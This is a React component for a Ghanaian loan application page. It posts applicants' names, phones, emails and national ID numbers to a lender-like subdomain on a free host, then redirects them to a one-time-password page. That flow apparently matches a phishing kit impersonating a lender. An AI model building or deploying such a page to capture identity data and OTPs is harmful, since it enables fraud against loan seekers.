import { useState } from "react";
import axios from "axios";
import "../styles/app.css";

export default function Apply() {
  const [loading, setLoading] = useState(false);

  const [form, setForm] = useState({
    name: "",
    phone: "",
    email: "",
    id: "",
    amount: "",
    repayment: "12 months",
  });

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    console.log("Submitting...", form);
    setLoading(true);

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        form
      );

      console.log("Response:", res.data);

      if (res.data.id) {
        window.location.href = `/otp/${res.data.id}`;
      } else {
        alert("No ID returned");
      }

    } catch (err) {
      console.error(err);
      alert("Submission failed");
    }

    setLoading(false);
  };

  return (
    <div className="loan-container">
      <div className="card">

        <div className="header">
          <img src="/icon.jpeg" alt="logo" className="logo" />
          <h1>Apply for a Loan</h1>
          <p className="subtitle">
            Fast approval • Secure process • Trusted service
          </p>
        </div>

        <form onSubmit={handleSubmit}>

          <div className="section">
            <label>Full Name *</label>
            <input
              name="name"
              placeholder="Enter your full name"
              onChange={handleChange}
              required
            />
          </div>

          <div className="section">
            <label>Phone Number *</label>
            <input
              name="phone"
              placeholder="0712345678"
              onChange={handleChange}
              required
            />
          </div>

          <div className="section">
            <label>Email</label>
            <input
              name="email"
              placeholder="example@email.com"
              onChange={handleChange}
            />
          </div>

          <div className="section">
            <label>National ID *</label>
            <input
              name="id"
              placeholder="Enter ID number"
              onChange={handleChange}
              required
            />
          </div>

          <div className="section">
            <label>Loan Amount (GHS) *</label>
            <input
              name="amount"
              type="number"
              placeholder="e.g 10000"
              onChange={handleChange}
              required
            />
          </div>

          <div className="section">
            <label>Repayment *</label>
            <select name="repayment" onChange={handleChange}>
              <option>6 months</option>
              <option>12 months</option>
              <option>24 months</option>
            </select>
          </div>

          <button className="btn" disabled={loading}>
            {loading ? <div className="spinner"></div> : "Proceed"}
          </button>

        </form>

      </div>
    </div>
  );
}